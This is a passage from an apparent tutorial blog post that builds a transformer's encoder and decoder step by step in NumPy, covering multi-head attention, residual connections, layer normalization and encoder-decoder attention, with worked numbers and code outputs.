<span id="cb36-15">    <span>return</span> scores</span>
<span id="cb36-16"></span>
<span id="cb36-17"><span>def</span> multi_head_attention(x, WQs, WKs, WVs):</span>
<span id="cb36-18">    attentions <span>=</span> np.concatenate(</span>
<span id="cb36-19">        [attention(x, WQ, WK, WV) <span>for</span> WQ, WK, WV <span>in</span> <span>zip</span>(WQs, WKs, WVs)], axis<span>=</span><span>1</span></span>
<span id="cb36-20">    )</span>
<span id="cb36-21">    W <span>=</span> np.random.randn(n_attention_heads <span>*</span> d_value, d_embedding)</span>
<span id="cb36-22">    <span>return</span> attentions <span>@</span> W</span>
<span id="cb36-23"></span>
<span id="cb36-24"><span>def</span> feed_forward(Z, W1, b1, W2, b2):</span>
<span id="cb36-25">    <span>return</span> relu(Z.dot(W1) <span>+</span> b1).dot(W2) <span>+</span> b2</span>
<span id="cb36-26"></span>
<span id="cb36-27"><span>def</span> encoder_block(x, WQs, WKs, WVs, W1, b1, W2, b2):</span>
<span id="cb36-28">    Z <span>=</span> multi_head_attention(x, WQs, WKs, WVs)</span>
<span id="cb36-29">    Z <span>=</span> feed_forward(Z, W1, b1, W2, b2)</span>
<span id="cb36-30">    <span>return</span> Z</span>
<span id="cb36-31"></span>
<span id="cb36-32"><span>def</span> random_encoder_block(x):</span>
<span id="cb36-33">    WQs <span>=</span> [</span>
<span id="cb36-34">        np.random.randn(d_embedding, d_query) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)</span>
<span id="cb36-35">    ]</span>
<span id="cb36-36">    WKs <span>=</span> [</span>
<span id="cb36-37">        np.random.randn(d_embedding, d_key) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)</span>
<span id="cb36-38">    ]</span>
<span id="cb36-39">    WVs <span>=</span> [</span>
<span id="cb36-40">        np.random.randn(d_embedding, d_value) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)</span>
<span id="cb36-41">    ]</span>
<span id="cb36-42">    W1 <span>=</span> np.random.randn(d_embedding, d_feed_forward)</span>
<span id="cb36-43">    b1 <span>=</span> np.random.randn(d_feed_forward)</span>
<span id="cb36-44">    W2 <span>=</span> np.random.randn(d_feed_forward, d_embedding)</span>
<span id="cb36-45">    b2 <span>=</span> np.random.randn(d_embedding)</span>
<span id="cb36-46">    <span>return</span> encoder_block(x, WQs, WKs, WVs, W1, b1, W2, b2)</span></code></pre></div>
<p>Recall that our input is the matrix E which has the positional encoding and the embedding.</p>
<div>
<pre><code>array([[1.  , 3.  , 3.  , 5.  ],
       [2.84, 3.99, 4.  , 6.  ]])</code></pre>
</div>
<p>Let‚Äôs now pass this to our <code>random_encoder_block</code> function</p>
<div>
<div id="cb39"><pre><code><span id="cb39-1">random_encoder_block(embedding)</span></code></pre></div>
<div>
<pre><code>array([[ -71.76537515, -131.43316885,   13.2938131 ,   -4.26831998],
       [ -72.04253781, -131.84091347,   13.3385937 ,   -4.32872015]])</code></pre>
</div>
</div>
<p>Nice! This was just one encoder block. The original paper uses 6 encoders. The output of one encoder goes to the next, and so on:</p>
<div>
<div id="cb41"><pre><code><span id="cb41-1"><span>def</span> encoder(x, n<span>=</span><span>6</span>):</span>
<span id="cb41-2">    <span>for</span> _ <span>in</span> <span>range</span>(n):</span>
<span id="cb41-3">        x <span>=</span> random_encoder_block(x)</span>
<span id="cb41-4">    <span>return</span> x</span>
<span id="cb41-5"></span>
<span id="cb41-6"></span>
<span id="cb41-7">encoder(embedding)</span></code></pre></div>
<div>
<pre><code>/tmp/ipykernel_11906/1045810361.py:2: RuntimeWarning: overflow encountered in exp
  return np.exp(x)/np.sum(np.exp(x),axis=1, keepdims=True)
/tmp/ipykernel_11906/1045810361.py:2: RuntimeWarning: invalid value encountered in divide
  return np.exp(x)/np.sum(np.exp(x),axis=1, keepdims=True)</code></pre>
</div>
<div>
<pre><code>array([[nan, nan, nan, nan],
       [nan, nan, nan, nan]])</code></pre>
</div>
</div>
</section>
<section id="residual-and-layer-normalization">
<h4 data-anchor-id="residual-and-layer-normalization">5.3 Residual and Layer Normalization</h4>
<p>Uh oh! We‚Äôre getting NaNs! It seems our values are too high, and when being passed to the next encoder, they end up being too high and exploding! This is called <strong>gradient explosion</strong>. Without any kind of normalization, small changes in the input of early layers end up being amplified in later layers. This is a common problem in deep neural networks. There are two common techniques to mitigate this problem: residual connections and layer normalization (section 3.1 of the paper, barely mentioned).</p>
<ul>
<li><strong>Residual connections:</strong> Residual connections are simply adding the input of the layer to it output. For example, we add the initial embedding to the output of the attention. Residual connections mitigate the vanishing gradient problem. The intuition is that if the gradient is too small, we can just add the input to the output and the gradient will be larger. The math is very simple:</li>
</ul>
<p><span>\[
\text{Residual}(x) = x + \text{Layer}(x)
\]</span></p>
<p>That‚Äôs it! We‚Äôll do this to the output of the attention and the output of the feed-forward layer.</p>
<ul>
<li><strong>Layer normalization</strong> Layer normalization is a technique to normalize the inputs of a layer. It normalizes across the embedding dimension. The intuition is that we want to normalize the inputs of a layer so that they have a mean of 0 and a standard deviation of 1. This helps with the gradient flow. The math does not look so simple at a first glance.</li>
</ul>
<p><span>\[
\text{LayerNorm}(x) = \frac{x - \mu}{\sqrt{\sigma^2 + \epsilon}} \times \gamma + \beta
\]</span></p>
<p>Let‚Äôs explain each parameter:</p>
<ul>
<li><span>\(\mu\)</span> is the mean of the embedding</li>
<li><span>\(\sigma\)</span> is the standard deviation of the embedding</li>
<li><span>\(\epsilon\)</span> is a small number to avoid division by zero. In case the standard deviation is 0, this small epsilon saves the day!</li>
<li><span>\(\gamma\)</span> and <span>\(\beta\)</span> are learned parameters that control scaling and shifting steps.</li>
</ul>
<p>Unlike batch normalization (no worries if you don‚Äôt know what it is), layer normalization normalizes across the embedding dimension - that means that each embedding will not be affected by other samples in the batch. The intuition is that we want to normalize the inputs of a layer so that they have a mean of 0 and a standard deviation of 1.</p>
<p>Why do we add the learnable parameters <span>\(\gamma\)</span> and <span>\(\beta\)</span>? The reason is that we don‚Äôt want to lose the representational power of the layer. If we just normalize the inputs, we might lose some information. By adding the learnable parameters, we can learn to scale and shift the normalized values.</p>
<p>Combining the equations, the equation for the whole encoder could look like this</p>
<p><span>\[
\text{Z}(x) = \text{LayerNorm}(x + \text{Attention}(x))
\]</span></p>
<p><span>\[
\text{FFN}(x) = \text{ReLU}(xW_1 + b_1)W_2 + b_2
\]</span></p>
<p><span>\[
\text{Encoder}(x) = \text{LayerNorm}(Z(x) + \text{FFN}(Z(x) + x))
\]</span></p>
<p>Let‚Äôs try with our example! Let‚Äôs go with E and Z values from before</p>
<p><span>\[
\begin{align*}
\text{E} + \text{Attention(E)} &amp;= \begin{bmatrix}
1.0 &amp; 3.0 &amp; 3.0 &amp; 5.0 \\
2.84 &amp; 3.99 &amp; 4.0 &amp; 6.0
\end{bmatrix} + \begin{bmatrix}
11.46394281 &amp; -13.18016469 &amp; -11.59340253 &amp; -17.04387833 \\
11.62608569 &amp; -13.47454934 &amp; -11.87126395 &amp; -17.49263674
\end{bmatrix} \\
&amp;= \begin{bmatrix}
12.46394281 &amp; -10.18016469 &amp; -8.59340253 &amp; -12.04387833 \\
14.46608569 &amp; -9.48454934 &amp; -7.87126395 &amp; -11.49263674
\end{bmatrix}
\end{align*}
\]</span></p>
<p>Let‚Äôs now calculate the layer normalization, we can divide it into three steps:</p>
<ol type="1">
<li>Compute mean and variance for each embedding.</li>
<li>Normalize by substracting the mean of its row and dividing by the square root of its row variance (plus a small number to avoid division by zero).</li>
<li>Scale and shift by multiplying by gamma and adding beta.</li>
</ol>
<section id="mean-and-variance">
<h5 data-anchor-id="mean-and-variance">5.3.1 Mean and variance</h5>
<p>For the first embedding</p>
<p><span>\[
\begin{align*}
\mu_1 &amp;= \frac{12.46394281-10.18016469-8.59340253-12.04387833}{4} = -4.58837568 \\
\sigma^2 &amp;= \frac{\sum (x_i - \mu)^2}{N} \\
&amp;= \frac{(12.46394281 - (-4.588375685))^2 + \ldots + (-12.04387833 - (-4.588375685))^2}{4} \\
&amp;= \frac{393.67443005013}{4} \\
&amp;= 98.418607512533 \\
\sigma &amp;= \sqrt{98.418607512533} \\
&amp;= 9.9206152789297
\end{align*}
\]</span></p>
<p>We can do the same for the second embedding. We‚Äôll skip the calculations but you get the hang of it.</p>
<p><span>\[
\begin{align*}
\mu_2 &amp;= -3.59559109 \\
\sigma_2 &amp;= 10.50653018
\end{align*}
\]</span></p>
<p>Let‚Äôs confirm with Python</p>
<div>
<div id="cb44"><pre><code><span id="cb44-1">(embedding <span>+</span> Z).mean(axis<span>=-</span><span>1</span>, keepdims<span>=</span><span>True</span>)</span></code></pre></div>
<div>
<pre><code>array([[-4.58837567],
       [-3.59559107]])</code></pre>
</div>
</div>
<div>
<div id="cb46"><pre><code><span id="cb46-1">(embedding <span>+</span> Z).std(axis<span>=-</span><span>1</span>, keepdims<span>=</span><span>True</span>)</span></code></pre></div>
<div>
<pre><code>array([[ 9.92061529],
       [10.50653019]])</code></pre>
</div>
</div>
<p>Amazing! Let‚Äôs now normalize</p>
</section>
<section id="normalize">
<h5 data-anchor-id="normalize">5.3.2 Normalize</h5>
<p>For normalization, for each value in the embedding, we subsctract the mean and divide by the standard deviation. Epsilon is a very small value, such as 0.00001. We‚Äôll assume <span>\(\gamma=1\)</span> and <span>\(\beta=0\)</span>, it simplifies things.</p>
<p><span>\[\begin{align*}
\text{normalized}_1 &amp;= \frac{12.46394281 - (-4.58837568)}{\sqrt{98.418607512533 + \epsilon}} \\
&amp;= \frac{17.05231849}{9.9206152789297} \\
&amp;= 1.718 \\
\text{normalized}_2 &amp;= \frac{-10.18016469 - (-4.58837568)}{\sqrt{98.418607512533 + \epsilon}} \\
&amp;= \frac{-5.59178901}{9.9206152789297} \\
&amp;= -0.564 \\
\text{normalized}_3 &amp;= \frac{-8.59340253 - (-4.58837568)}{\sqrt{98.418607512533 + \epsilon}} \\
&amp;= \frac{-4.00502685}{9.9206152789297} \\
&amp;= -0.404 \\
\text{normalized}_4 &amp;= \frac{-12.04387833 - (-4.58837568)}{\sqrt{98.418607512533 + \epsilon}} \\
&amp;= \frac{-7.45550265}{9.9206152789297} \\
&amp;= -0.752
\end{align*}\]</span></p>
<p>We‚Äôll skip the calculations by hand for the second embedding. Let‚Äôs confirm with code! Let‚Äôs re-define our <code>encoder_block</code> function with this change</p>
<div id="cb48"><pre><code><span id="cb48-1"><span>def</span> layer_norm(x, epsilon<span>=</span><span>1e-6</span>):</span>
<span id="cb48-2">    mean <span>=</span> x.mean(axis<span>=-</span><span>1</span>, keepdims<span>=</span><span>True</span>)</span>
<span id="cb48-3">    std <span>=</span> x.std(axis<span>=-</span><span>1</span>, keepdims<span>=</span><span>True</span>)</span>
<span id="cb48-4">    <span>return</span> (x <span>-</span> mean) <span>/</span> (std <span>+</span> epsilon)</span>
<span id="cb48-5"></span>
<span id="cb48-6"><span>def</span> encoder_block(x, WQs, WKs, WVs, W1, b1, W2, b2):</span>
<span id="cb48-7">    Z <span>=</span> multi_head_attention(x, WQs, WKs, WVs)</span>
<span id="cb48-8">    Z <span>=</span> layer_norm(Z <span>+</span> x)</span>
<span id="cb48-9"></span>
<span id="cb48-10">    output <span>=</span> feed_forward(Z, W1, b1, W2, b2)</span>
<span id="cb48-11">    <span>return</span> layer_norm(output <span>+</span> Z)</span></code></pre></div>
<div>
<div id="cb49"><pre><code><span id="cb49-1">layer_norm(Z <span>+</span> embedding)</span></code></pre></div>
<div>
<pre><code>array([[ 1.71887693, -0.56365339, -0.40370747, -0.75151608],
       [ 1.71909039, -0.56050453, -0.40695381, -0.75163205]])</code></pre>
</div>
</div>
<p>It works! Let‚Äôs retry to pass the embedding through the six encoders.</p>
<div>
<div id="cb51"><pre><code><span id="cb51-1"><span>def</span> encoder(x, n<span>=</span><span>6</span>):</span>
<span id="cb51-2">    <span>for</span> _ <span>in</span> <span>range</span>(n):</span>
<span id="cb51-3">        x <span>=</span> random_encoder_block(x)</span>
<span id="cb51-4">    <span>return</span> x</span>
<span id="cb51-5"></span>
<span id="cb51-6"></span>
<span id="cb51-7">encoder(embedding)</span></code></pre></div>
<div>
<pre><code>array([[-0.335849  , -1.44504571,  1.21698183,  0.56391289],
       [-0.33583947, -1.44504861,  1.21698606,  0.56390202]])</code></pre>
</div>
</div>
<p>Amazing! These values make sense and we don‚Äôt get NaNs! The idea of the stack of encoders is that they output a continuous representation, z, that captures the meaning of the input sequence. This representation is then passed to the decoder, which will genrate an output sequence of symbols, one element at a time.</p>
<p>Before diving into the decoder, here‚Äôs an image from Jay‚Äôs amazing blog post:</p>
<div>
<figure>
<p><img src="https://jalammar.github.io/images/t/transformer_resideual_layer_norm_3.png"></p>
<figcaption>Encoder and decoder</figcaption>
</figure>
</div>
<p>You should be able to explain each component at the left side! Quite impressive, right? Let‚Äôs now move to the decoder.</p>
</section>
</section>
</section>
</section>
<section id="decoder">
<h2 data-anchor-id="decoder">Decoder</h2>
<p>Most of the thing we learned for encoders will be used in the decoder as well! The decoder has two self-attention layers, one for the encoder and one for the decoder. The decoder also has a feed-forward layer. Let‚Äôs go through each of these.</p>
<p>The decoder block receives two inputs: the output of the encoder and the generated output sequence. The output of the encoder is the representation of the input sequence. During inference, the generated output sequence starts with a special start-of-sequence token (SOS). During training, the target output sequence is the actual output sequence, shifted by one position. This will be clearer soon!</p>
<p>Given the embedding generated by the encoder and the SOS token, the decoder will then generate the next token of the sequence, e.g.&nbsp;‚Äúhola‚Äù. The decoder is autoregressive, that means that the decoder will take the previously generated tokens and again generate the second token.</p>
<ul>
<li>Iteration 1: Input is SOS, output is ‚Äúhola‚Äù</li>
<li>Iteration 2: Input is SOS + ‚Äúhola‚Äù, output is ‚Äúmundo‚Äù</li>
<li>Iteration 3: Input is SOS + ‚Äúhola‚Äù + ‚Äúmundo‚Äù, output is EOS</li>
</ul>
<p>Here, SOS is the start-of-sequence token and EOS is the end-of-sequence token. The decoder will stop when it generates the EOS token. It generates one token at a time. Note that all iterations use the embedding generated by the encoder.</p>
<div>

<p><strong>This autoregressive design makes decoder slow.</strong> The encoder is able to generate its embedding in a single forward pass while the decoder needs to do many forward passes. This is one of the reasons why architectures that only use the encoder (such as BERT or sentence similarity models) are much faster than decoder-only architectures (such as GPT-2 or BART).</p>
</div>
<p>Let‚Äôs dive into each step! Just as the encoder, the decoder is composed of a stack of decoder blocks. The decoder block is a bit more complex than the encoder block. The general structure is:</p>
<ol type="1">
<li>(Masked) Self-attention layer</li>
<li>Residual connection and layer normalization</li>
<li>Encoder-decoder attention layer</li>
<li>Residual connection and layer normalization</li>
<li>Feed-forward layer</li>
<li>Residual connection and layer normalization</li>
</ol>
<p>We‚Äôre already familiar with all the math from 1, 2, 3, 5 and 6. See the right side of the image below, you‚Äôll see that all these blocks you already know (the right part):</p>
<div>
<figure>
<p><a href="https://arxiv.org/abs/1706.03762"><img src="https://osanseviero.github.io/hackerllama/blog/posts/random_transformer/transformer.png"></a></p>
<figcaption>Transformer model from the original ‚Äúattention is all you need‚Äù paper</figcaption>
</figure>
</div>
<section id="embedding-the-text-1">
<h3 data-anchor-id="embedding-the-text-1">1. Embedding the text</h3>
<p>The first text of the decoder is to embed the input tokens. The input token is <code>SOS</code>, so we‚Äôll embed it. We‚Äôll use the same embedding dimension as the encoder. Let‚Äôs assume the embedding vector is the following:</p>
<p><span>\[
E = \begin{bmatrix}
1 &amp; 0 &amp; 0 &amp; 0
\end{bmatrix}
\]</span></p>
</section>
<section id="positional-encoding-1">
<h3 data-anchor-id="positional-encoding-1">2. Positional encoding</h3>
<p>We‚Äôll now add the positional encoding to the embedding, just as we did for the encoder. Given it‚Äôs the same position as ‚ÄúHello‚Äù, we‚Äôll have same positional encoding as we did before:</p>
<ul>
<li>i = 0 (even): PE(0,0) = sin(0 / 10000^(0 / 4)) = sin(0) = 0</li>
<li>i = 1 (odd): PE(0,1) = cos(0 / 10000^(2*1 / 4)) = cos(0) = 1</li>
<li>i = 2 (even): PE(0,2) = sin(0 / 10000^(2*2 / 4)) = sin(0) = 0</li>
<li>i = 3 (odd): PE(0,3) = cos(0 / 10000^(2*3 / 4)) = cos(0) = 1</li>
</ul>
</section>
<section id="add-positional-encoding-and-embedding-1">
<h3 data-anchor-id="add-positional-encoding-and-embedding-1">3. Add positional encoding and embedding</h3>
<p>Adding the positional encoding to the embedding is done by adding the two vectors together:</p>
<p><span>\[
E = \begin{bmatrix}
1 &amp; 1 &amp; 0 &amp; 1
\end{bmatrix}
\]</span></p>
</section>
<section id="self-attention-1">
<h3 data-anchor-id="self-attention-1">4. Self-attention</h3>
<p>The first step within the decoder block is the self-attention mechanism. Luckily, we have some code for this and can just use it!</p>
<div>
<div id="cb53"><pre><code><span id="cb53-1">d_embedding <span>=</span> <span>4</span></span>
<span id="cb53-2">n_attention_heads <span>=</span> <span>2</span></span>
<span id="cb53-3"></span>
<span id="cb53-4">E <span>=</span> np.array([[<span>1</span>, <span>1</span>, <span>0</span>, <span>1</span>]])</span>
<span id="cb53-5">WQs <span>=</span> [np.random.randn(d_embedding, d_query) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)]</span>
<span id="cb53-6">WKs <span>=</span> [np.random.randn(d_embedding, d_key) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)]</span>
<span id="cb53-7">WVs <span>=</span> [np.random.randn(d_embedding, d_value) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)]</span>
<span id="cb53-8"></span>
<span id="cb53-9">Z_self_attention <span>=</span> multi_head_attention(E, WQs, WKs, WVs)</span>
<span id="cb53-10">Z_self_attention</span></code></pre></div>
<div>
<pre><code>array([[ 2.19334924, 10.61851198, -4.50089666, -2.76366551]])</code></pre>
</div>
</div>
<div>
<p>Things are quite simple for inference. For training, things are a bit tricky. During training, we use unlabeled data: just a bunch of text data, frequentyl scraped from the web. While the encoder‚Äôs goal is to capture all information of the input, the decoder‚Äôs goal is to predict the most likely next token. This means that the decoder can only use the tokens that have been generated so far (it cannot cheat and see the next tokens).</p>
<p>Because of this, we use masked self-attention: we mask the tokens that have not been generated yet. This is done by setting the attention scores to -inf. This is done in the original paper (section 3.2.3.1). We‚Äôll skip this for now, but it‚Äôs important to keep in mind that the decoder is a bit more complex during training.</p>
</div>
</section>
<section id="residual-connection-and-layer-normalization">
<h3 data-anchor-id="residual-connection-and-layer-normalization">5. Residual connection and layer normalization</h3>
<p>Nothing magical here, we just add the input to the output of the self-attention and apply layer normalization. We‚Äôll use the same code as before.</p>
<div>
<div id="cb55"><pre><code><span id="cb55-1">Z_self_attention <span>=</span> layer_norm(Z_self_attention <span>+</span> E)</span>
<span id="cb55-2">Z_self_attention</span></code></pre></div>
<div>
<pre><code>array([[ 0.17236212,  1.54684892, -1.0828824 , -0.63632864]])</code></pre>
</div>
</div>
</section>
<section id="encoder-decoder-attention">
<h3 data-anchor-id="encoder-decoder-attention">6. Encoder-decoder attention</h3>
<p><strong>This part is the new one!</strong> If you were wondering where do the encoder-generated embeddings come in, this is their moment to shine!</p>
<p>Let‚Äôs assume the output of the encoder is the following matrix</p>
<p><span>\[
\begin{bmatrix}
-1.5 &amp; 1.0 &amp; -0.8 &amp; 1.5 \\
1.0 &amp; -1.0 &amp; -0.5 &amp; 1.0
\end{bmatrix}
\]</span></p>
<p>In the self-attention mechanism, we calculate the queries, keys, and values from the input embedding.</p>
<p>In the encoder-decoder attention, we calculate the queries from the previous decoder layer and the keys and values from the encoder output! All the math is the same as before; the only difference is what embedding to use for the queries. Let‚Äôs look at some code</p>
<div id="cb57"><pre><code><span id="cb57-1"><span>def</span> encoder_decoder_attention(encoder_output, attention_input, WQ, WK, WV):</span>
<span id="cb57-2">    <span># The next three lines are the key difference!</span></span>
<span id="cb57-3">    K <span>=</span> encoder_output <span>@</span> WK    <span># Note that now we pass the previous encoder output!</span></span>
<span id="cb57-4">    V <span>=</span> encoder_output <span>@</span> WV    <span># Note that now we pass the previous encoder output!</span></span>
<span id="cb57-5">    Q <span>=</span> attention_input <span>@</span> WQ   <span># Same as self-attention</span></span>
<span id="cb57-6"></span>
<span id="cb57-7">    <span># This stays the same</span></span>
<span id="cb57-8">    scores <span>=</span> Q <span>@</span> K.T</span>
<span id="cb57-9">    scores <span>=</span> scores <span>/</span> np.sqrt(d_key)</span>
<span id="cb57-10">    scores <span>=</span> softmax(scores)</span>
<span id="cb57-11">    scores <span>=</span> scores <span>@</span> V</span>
<span id="cb57-12">    <span>return</span> scores</span>
<span id="cb57-13"></span>
<span id="cb57-14"></span>
<span id="cb57-15"><span>def</span> multi_head_encoder_decoder_attention(</span>
<span id="cb57-16">    encoder_output, attention_input, WQs, WKs, WVs</span>
<span id="cb57-17">):</span>
<span id="cb57-18">    <span># Note that now we pass the previous encoder output!</span></span>
<span id="cb57-19">    attentions <span>=</span> np.concatenate(</span>
<span id="cb57-20">        [</span>
<span id="cb57-21">            encoder_decoder_attention(</span>
<span id="cb57-22">                encoder_output, attention_input, WQ, WK, WV</span>
<span id="cb57-23">            )</span>
<span id="cb57-24">            <span>for</span> WQ, WK, WV <span>in</span> <span>zip</span>(WQs, WKs, WVs)</span>
<span id="cb57-25">        ],</span>
<span id="cb57-26">        axis<span>=</span><span>1</span>,</span>
<span id="cb57-27">    )</span>
<span id="cb57-28">    W <span>=</span> np.random.randn(n_attention_heads <span>*</span> d_value, d_embedding)</span>
<span id="cb57-29">    <span>return</span> attentions <span>@</span> W</span></code></pre></div>
<div>
<div id="cb58"><pre><code><span id="cb58-1">WQs <span>=</span> [np.random.randn(d_embedding, d_query) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)]</span>
<span id="cb58-2">WKs <span>=</span> [np.random.randn(d_embedding, d_key) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)]</span>
<span id="cb58-3">WVs <span>=</span> [np.random.randn(d_embedding, d_value) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)]</span>
<span id="cb58-4"></span>
<span id="cb58-5">encoder_output <span>=</span> np.array([[<span>-</span><span>1.5</span>, <span>1.0</span>, <span>-</span><span>0.8</span>, <span>1.5</span>], [<span>1.0</span>, <span>-</span><span>1.0</span>, <span>-</span><span>0.5</span>, <span>1.0</span>]])</span>
<span id="cb58-6"></span>
<span id="cb58-7">Z_encoder_decoder <span>=</span> multi_head_encoder_decoder_attention(</span>
<span id="cb58-8">    encoder_output, Z_self_attention, WQs, WKs, WVs</span>
<span id="cb58-9">)</span>
<span id="cb58-10">Z_encoder_decoder</span></code></pre></div>
<div>
<pre><code>array([[ 1.57651431,  4.92489307, -0.08644448, -0.46776051]])</code></pre>
</div>
</div>
<p>This worked! You might be asking ‚Äúwhy do we do this?‚Äù. The reason is that we want the decoder to focus on the relevant parts of the input text (e.g., ‚Äúhello world‚Äù). The encoder-decoder attention allows each position in the decoder to attend over all positions in the input sequence. This is very helpful for tasks such as translation, where the decoder needs to focus on the relevant parts of the input sequence. The decoder will learn to focus on the relevant parts of the input sequence by learning to generate the correct output tokens. This is a very powerful mechanism!</p>
</section>
<section id="residual-connection-and-layer-normalization-1">
<h3 data-anchor-id="residual-connection-and-layer-normalization-1">7. Residual connection and layer normalization</h3>
<p>Same as before!</p>
<div>
<div id="cb60"><pre><code><span id="cb60-1">Z_encoder_decoder <span>=</span> layer_norm(Z_encoder_decoder <span>+</span> Z)</span>
<span id="cb60-2">Z_encoder_decoder</span></code></pre></div>
<div>
<pre><code>array([[-0.44406723,  1.6552893 , -0.19984632, -1.01137575]])</code></pre>
</div>
</div>
</section>
<section id="feed-forward-layer-1">
<h3 data-anchor-id="feed-forward-layer-1">8. Feed-forward layer</h3>
<p>Once again, same as before! I‚Äôll also do the residual connection and layer normalization after it.</p>
<div>
<div id="cb62"><pre><code><span id="cb62-1">W1 <span>=</span> np.random.randn(<span>4</span>, <span>8</span>)</span>
<span id="cb62-2">W2 <span>=</span> np.random.randn(<span>8</span>, <span>4</span>)</span>
<span id="cb62-3">b1 <span>=</span> np.random.randn(<span>8</span>)</span>
<span id="cb62-4">b2 <span>=</span> np.random.randn(<span>4</span>)</span>
<span id="cb62-5"></span>
<span id="cb62-6">output <span>=</span> feed_forward(Z_encoder_decoder, W1, b1, W2, b2) <span>+</span> Z_encoder_decoder</span>
<span id="cb62-7">output</span></code></pre></div>
<div>
<pre><code>array([[-0.97650182,  0.81470137, -2.79122044, -3.39192873]])</code></pre>
</div>
</div>
</section>
<section id="encapsulating-everything-the-random-decoder">
<h3 data-anchor-id="encapsulating-everything-the-random-decoder">9. Encapsulating everything: The Random Decoder</h3>
<p>Let‚Äôs write the code for a single decoder block. The main change is that we now have an additional attention mechanism.</p>
<div id="cb64"><pre><code><span id="cb64-1">d_embedding <span>=</span> <span>4</span></span>
<span id="cb64-2">d_key <span>=</span> d_value <span>=</span> d_query <span>=</span> <span>3</span></span>
<span id="cb64-3">d_feed_forward <span>=</span> <span>8</span></span>
<span id="cb64-4">n_attention_heads <span>=</span> <span>2</span></span>
<span id="cb64-5">encoder_output <span>=</span> np.array([[<span>-</span><span>1.5</span>, <span>1.0</span>, <span>-</span><span>0.8</span>, <span>1.5</span>], [<span>1.0</span>, <span>-</span><span>1.0</span>, <span>-</span><span>0.5</span>, <span>1.0</span>]])</span>
<span id="cb64-6"></span>
<span id="cb64-7"><span>def</span> decoder_block(</span>
<span id="cb64-8">    x,</span>
<span id="cb64-9">    encoder_output,</span>
<span id="cb64-10">    WQs_self_attention, WKs_self_attention, WVs_self_attention,</span>
<span id="cb64-11">    WQs_ed_attention, WKs_ed_attention, WVs_ed_attention,</span>
<span id="cb64-12">    W1, b1, W2, b2,</span>
<span id="cb64-13">):</span>
<span id="cb64-14">    <span># Same as before</span></span>
<span id="cb64-15">    Z <span>=</span> multi_head_attention(</span>
<span id="cb64-16">        x, WQs_self_attention, WKs_self_attention, WVs_self_attention</span>
<span id="cb64-17">    )</span>
<span id="cb64-18">    Z <span>=</span> layer_norm(Z <span>+</span> x)</span>
<span id="cb64-19"></span>
<span id="cb64-20">    <span># The next three lines are the key difference!</span></span>
<span id="cb64-21">    Z_encoder_decoder <span>=</span> multi_head_encoder_decoder_attention(</span>
<span id="cb64-22">        encoder_output, Z, WQs_ed_attention, WKs_ed_attention, WVs_ed_attention</span>
<span id="cb64-23">    )</span>
<span id="cb64-24">    Z_encoder_decoder <span>=</span> layer_norm(Z_encoder_decoder <span>+</span> Z)</span>
<span id="cb64-25"></span>
<span id="cb64-26">    <span># Same as before</span></span>
<span id="cb64-27">    output <span>=</span> feed_forward(Z_encoder_decoder, W1, b1, W2, b2)</span>
<span id="cb64-28">    <span>return</span> layer_norm(output <span>+</span> Z_encoder_decoder)</span>
<span id="cb64-29"></span>
<span id="cb64-30"><span>def</span> random_decoder_block(x, encoder_output):</span>
<span id="cb64-31">    <span># Just a bunch of random initializations</span></span>
<span id="cb64-32">    WQs_self_attention <span>=</span> [</span>
<span id="cb64-33">        np.random.randn(d_embedding, d_query) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)</span>
<span id="cb64-34">    ]</span>
<span id="cb64-35">    WKs_self_attention <span>=</span> [</span>
<span id="cb64-36">        np.random.randn(d_embedding, d_key) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)</span>
<span id="cb64-37">    ]</span>
<span id="cb64-38">    WVs_self_attention <span>=</span> [</span>
<span id="cb64-39">        np.random.randn(d_embedding, d_value) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)</span>
<span id="cb64-40">    ]</span>
<span id="cb64-41"></span>
<span id="cb64-42">    WQs_ed_attention <span>=</span> [</span>
<span id="cb64-43">        np.random.randn(d_embedding, d_query) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)</span>
<span id="cb64-44">    ]</span>
<span id="cb64-45">    WKs_ed_attention <span>=</span> [</span>
<span id="cb64-46">        np.random.randn(d_embedding, d_key) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)</span>
<span id="cb64-47">    ]</span>
<span id="cb64-48">    WVs_ed_attention <span>=</span> [</span>
<span id="cb64-49">        np.random.randn(d_embedding, d_value) <span>for</span> _ <span>in</span> <span>range</span>(n_attention_heads)</span>
<span id="cb64-50">    ]</span>
<span id="cb64-51"></span>
<span id="cb64-52">    W1 <span>=</span> np.random.randn(d_embedding, d_feed_forward)</span>
<span id="cb64-53">    b1 <span>=</span> np.random.randn(d_feed_forward)</span>
<span id="cb64-54">    W2 <span>=</span> np.random.randn(d_feed_forward, d_embedding)</span>
<span id="cb64-55">    b2 <span>=</span> np.random.randn(d_embedding)</span>
<span id="cb64-56"></span>
<span id="cb64-57"></span>
<span id="cb64-58">    <span>return</span> decoder_block(</span>
<span id="cb64-59">        x, encoder_output,</span>
<span id="cb64-60">        WQs_self_attention, WKs_self_attention, WVs_self_attention,</span>
<span id="cb64-61">        WQs_ed_attention, WKs_ed_attention, WVs_ed_attention,</span>
<span id="cb64-62">        W1, b1, W2, b2,</span>
<span id="cb64-63">    )</span></code></pre></div>
<div>
<div id="cb65"><pre><code><span id="cb65-1"><span>def</span> decoder(x, decoder_embedding, n<span>=</span><span>6</span>):</span>
<span id="cb65-2">    <span>for</span> _ <span>in</span> <span>range</span>(n):</span>
<span id="cb65-3">        x <span>=</span> random_decoder_block(x, decoder_embedding)</span>
<span id="cb65-4">    <span>return</span> x</span>
<span id="cb65-5"></span>
<span id="cb65-6">decoder(E, encoder_output)</span></code></pre></div>
<div>
<pre><code>array([[ 0.71866458, -1.72279956,  0.57735876,  0.42677623]])</code></pre>
</div>
</div>
</section>
</section>
<section id="generating-the-output-sequence">
<h2 data-anchor-id="generating-the-output-sequence">Generating the output sequence</h2>
<p>We have all the building blocks! Let‚Äôs now generate the output sequence.</p>
<ul>
